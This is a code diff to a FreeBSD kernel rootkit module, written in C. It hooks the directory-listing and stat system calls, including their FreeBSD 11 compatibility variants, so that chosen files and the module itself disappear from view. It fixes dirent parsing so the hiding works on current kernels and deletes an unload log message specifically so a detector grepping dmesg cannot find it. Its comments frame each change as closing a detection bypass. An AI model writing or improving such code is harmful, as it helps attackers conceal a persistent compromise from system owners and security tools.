@@ -243,56 +243,163 @@ static int is_hiding_path(char kpath[MAXPATHLEN]) {
 }
 
 static sy_call_t *orig_getdirentries = NULL;
+static sy_call_t *orig_freebsd11_getdirentries = NULL;
+static sy_call_t *orig_freebsd11_fstatat = NULL;
+
+/*
+ * The two dirent layouts have nothing in common except their field order, and
+ * they do not even share offsets:
+ *
+ *   struct dirent (12.0 and later)
+ *       ino_t    d_fileno    0..7
+ *       off_t    d_off       8..15     <- added in 12.0
+ *       uint16_t d_reclen    16
+ *       uint8_t  d_type      18
+ *       uint8_t  d_pad0      19
+ *       uint16_t d_namlen    20
+ *       uint16_t d_pad1      22
+ *       char     d_name[]    24
+ *
+ *   struct freebsd11_dirent
+ *       uint32_t d_fileno    0..3
+ *       uint16_t d_reclen    4
+ *       uint8_t  d_type      6
+ *       uint8_t  d_pad0      7
+ *       uint16_t d_namlen    8
+ *       uint16_t d_pad1      10
+ *       char     d_name[]    12
+ *
+ * An earlier version assumed both had d_reclen at 4 and d_name at 12, which is
+ * true only of the 11.x layout: on a 14.5 host the walker read a fragment of
+ * d_fileno as the record length and the filter silently removed nothing.
+ */
+#define RK_DIRENT_RECLEN_OFF	16
+#define RK_DIRENT_NAME_OFF	24
+#define RK_GDE11_RECLEN_OFF	4
+#define RK_GDE11_NAME_OFF	12
+
+/*
+ * Remove the hidden names from a packed dirent buffer in place.
+ *
+ * The advance is what the old loop got wrong. After a record is dropped the
+ * next one has already been moved under the cursor, so the cursor must stay
+ * put and only the remaining count shrinks; advancing by the pre-move
+ * d_reclen stepped over the end of the buffer.
+ */
+static size_t
+rk_filter_dirents(char *buf, size_t size, size_t reclen_off, size_t name_off)
+{
+	size_t count, reclen;
+	char *cur, name[NAME_MAX + 1];
+	uint16_t raw;
+
+	count = size;
+	cur = buf;
+	while (count > name_off) {
+		memcpy(&raw, cur + reclen_off, sizeof(raw));
+		reclen = raw;
+
+		if (reclen <= name_off || reclen > count)
+			break;
+
+		strlcpy(name, cur + name_off, sizeof(name));
+
+		if (is_hiding_path(name)) {
+			memmove(cur, cur + reclen, count - reclen);
+			size -= reclen;
+			count -= reclen;
+			continue;
+		}
+
+		count -= reclen;
+		cur += reclen;
+	}
+
+	return (size);
+}
+
+static int
+rk_filter_user_dirents(struct thread *td, char *ubuf, size_t reclen_off,
+    size_t name_off)
+{
+	size_t size;
+	char *kbuf;
+	int error;
+
+	size = td->td_retval[0];
+	if (size == 0 || ubuf == NULL)
+		return (0);
+
+	kbuf = malloc(size, M_TEMP, M_WAITOK);
+	if (copyin(ubuf, kbuf, size) != 0) {
+		free(kbuf, M_TEMP);
+		return (EFAULT);
+	}
+
+	size = rk_filter_dirents(kbuf, size, reclen_off, name_off);
+
+	error = copyout(kbuf, ubuf, size);
+	free(kbuf, M_TEMP);
+
+	td->td_retval[0] = size;
+	return (error);
+}
 
 static int getdirentries_hook(struct thread *td, void *syscall_args) {
     struct getdirentries_args *uap; 
+    int error;
+
     uap = (struct getdirentries_args *) syscall_args;
-    size_t size, count;
-    struct dirent *d;
-    int error = orig_getdirentries(td, syscall_args);
-    size = td->td_retval[0];
+    error = orig_getdirentries(td, syscall_args);
+    if (error != 0 || td->td_retval[0] <= 0)
+        return (error);
 
-    if (size > 0) {
-        d = malloc(size, M_TEMP, M_WAITOK);
-        if (copyin(uap->buf, d, size) != 0) {
-            free(d, M_TEMP);
-            return (error);
-        }
+    if (rk_filter_user_dirents(td, uap->buf, RK_DIRENT_RECLEN_OFF,
+            RK_DIRENT_NAME_OFF) != 0)
+        return (EIO);
 
-        count = size;
-        struct dirent *curr_rec = d;
-        while (count > 0) {
-            size_t reclen = curr_rec->d_reclen;
+    return (error);
+}
 
-            if (reclen == 0 || reclen > count) {
-                free(d, M_TEMP);
-                return (EIO);
-            }
+/*
+ * freebsd11_getdirentries is the same call with the older dirent struct. It
+ * stays reachable from any binary built before 12.0, so leaving it unhooked
+ * left a one-line bypass of the directory filter.
+ *
+ * The kernel's own freebsd11_*_args structs are not always visible from a
+ * module: sysproto.h only declares them when COMPAT_FREEBSD11 is configured
+ * into that build, and a forward declaration alone will not compile. The
+ * layouts below are the wire layout of the two syscalls, which cannot change
+ * without breaking every pre-12 binary, so spelling them out here is stable.
+ */
+struct rk_gde11_args {
+	int	fd;
+	char	*buf;
+	u_int	count;
+	long	*basep;
+};
 
-            // Add more module to hide here
-            if (is_hiding_path(curr_rec->d_name) || strcmp(curr_rec->d_name, "hiding.ko") == 0
-                || strcmp(curr_rec->d_name, "rootkit.ko") == 0
-                || strcmp(curr_rec->d_name, "rc.local") == 0
-                || strcmp(curr_rec->d_name, "rc.conf") == 0
-            ) {
-                size_t remaining = count - reclen;
+struct rk_fstatat11_args {
+	int	fd;
+	char	*path;
+	void	*buf;
+	int	flag;
+};
 
-                memmove(curr_rec, (char *)curr_rec + reclen, remaining);
-                size -= reclen;
-                count -= reclen;
-                continue;
-            }
+static int freebsd11_getdirentries_hook(struct thread *td, void *syscall_args) {
+    struct rk_gde11_args *uap;
+    int error;
 
-            count -= reclen;
-            curr_rec = (struct dirent *)((char *)curr_rec + reclen);
-        }
+    uap = (struct rk_gde11_args *) syscall_args;
+    error = orig_freebsd11_getdirentries(td, syscall_args);
+    if (error != 0 || td->td_retval[0] <= 0)
+        return (error);
 
-        td->td_retval[0] = size;
-        copyout(d, uap->buf, size);
-        free(d, M_TEMP);
-    }
+    if (rk_filter_user_dirents(td, uap->buf, RK_GDE11_RECLEN_OFF,
+            RK_GDE11_NAME_OFF) != 0)
+        return (EIO);
 
-    return error;
+    return (error);
 }
 
 static sy_call_t *orig_fstatat = NULL;
@@ -399,6 +506,29 @@ fstatat_hook(struct thread *td, void *syscall_args)
         return (ENOENT);
 
     return (orig_fstatat(td, syscall_args));
+}
+
+/*
+ * The 11.0 stat(2) ABI: same arguments, different struct stat behind the
+ * pointer. Nothing in the filter reads that struct, so the native body
+ * applies -- only the path has to be filtered before the original syscall
+ * resolves it.
+ */
+static int
+freebsd11_fstatat_hook(struct thread *td, void *syscall_args)
+{
+	struct rk_fstatat11_args *uap =
+	    (struct rk_fstatat11_args *)syscall_args;
+	char kpath[MAXPATHLEN];
+	size_t done;
+
+	if (copyinstr(uap->path, kpath, sizeof(kpath), &done) != 0)
+		return (EFAULT);
+
+	if (is_hiding_path(kpath))
+		return (ENOENT);
+
+	return (orig_freebsd11_fstatat(td, syscall_args));
 }
 
 static int
@@ -740,6 +870,18 @@ kld_hiding(struct thread *td __unused, void *syscall_args) {
     if (copyinstr(uap->mod_name, rk_hide_name, sizeof(rk_hide_name), NULL) != 0)
         return (EFAULT);
 
+    /*
+     * An empty name means "stop hiding". Without this the only way back to a
+     * visible module is a reboot, which makes kldunload -- and therefore any
+     * uninstall -- impossible once hiding is on: kldfind answers ENOENT, so
+     * the tree can no longer name the module it wants to drop.
+     */
+    if (rk_hide_name[0] == '\0') {
+        rk_hide_enabled = 0;
+        rk_hide_id = -1;
+        return (0);
+    }
+
     rk_hide_id = -1;
     rk_locate_self();
     rk_hide_enabled = 1;
@@ -791,6 +933,14 @@ rk_install_hooks(void)
     orig_fstatat = sysent[SYS_fstatat].sy_call;
     sysent[SYS_fstatat].sy_call = (sy_call_t *) fstatat_hook;
 
+    orig_freebsd11_fstatat = sysent[SYS_freebsd11_fstatat].sy_call;
+    sysent[SYS_freebsd11_fstatat].sy_call =
+        (sy_call_t *) freebsd11_fstatat_hook;
+
+    orig_freebsd11_getdirentries = sysent[SYS_freebsd11_getdirentries].sy_call;
+    sysent[SYS_freebsd11_getdirentries].sy_call =
+        (sy_call_t *) freebsd11_getdirentries_hook;
+
     orig_openat = sysent[SYS_openat].sy_call;
     sysent[SYS_openat].sy_call = (sy_call_t *) openat_hook;
 
@@ -831,6 +981,13 @@ rk_remove_hooks(void)
 
     if (orig_fstatat != NULL)
         sysent[SYS_fstatat].sy_call = orig_fstatat;
+
+    if (orig_freebsd11_fstatat != NULL)
+        sysent[SYS_freebsd11_fstatat].sy_call = orig_freebsd11_fstatat;
+
+    if (orig_freebsd11_getdirentries != NULL)
+        sysent[SYS_freebsd11_getdirentries].sy_call =
+            orig_freebsd11_getdirentries;
 
     if (orig_openat != NULL)
         sysent[SYS_openat].sy_call = orig_openat;
@@ -953,7 +1110,11 @@ static int load(module_t module, int cmd, void *arg) {
         cv_destroy(&remote_cv);
         mtx_destroy(&remote_mtx);
         rk_hidden_destroy();
-        printf("rootkit: module unloaded\n");
+        /*
+         * No printf here. Unloading is the one moment the module is visible
+         * again, and "rootkit: module unloaded" stays in the message buffer
+         * afterwards -- a detector only has to grep dmesg for the name.
+         */
         break;
 
     case MOD_SHUTDOWN:
